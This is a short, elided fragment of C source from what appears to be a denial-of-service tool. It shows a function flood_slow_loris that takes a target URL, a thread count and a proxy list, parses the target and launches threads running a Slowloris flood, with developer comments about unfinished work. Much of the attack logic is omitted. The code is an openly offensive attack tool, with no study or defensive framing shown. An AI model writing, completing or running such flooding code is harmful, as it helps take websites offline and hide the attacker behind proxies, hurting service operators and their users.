...
// ******SERIOUS***** add the proxy file list here.
#define DEFAULT_PROXIES "proxies.txt"
...
// *******serious********
// -> replace all occurances of argv and argc.
// -> add close all thread functionality.
void flood_slow_loris(char *url_to_attack, int num_threads, char *file_pr, int f_read)
{
        if (file_pr == NULL)
                file_pr = DEFAULT_PROXIES;
        ...
        setupparts();
        parseURL(url_to_attack, returnparts);
        struct hostent *he;
        struct in_addr a;
        ...
        for(i = 0;i<num_threads;i++){
                pthread_create( &thread[i], NULL, &flood_SL, (void *) td[i]);
        }
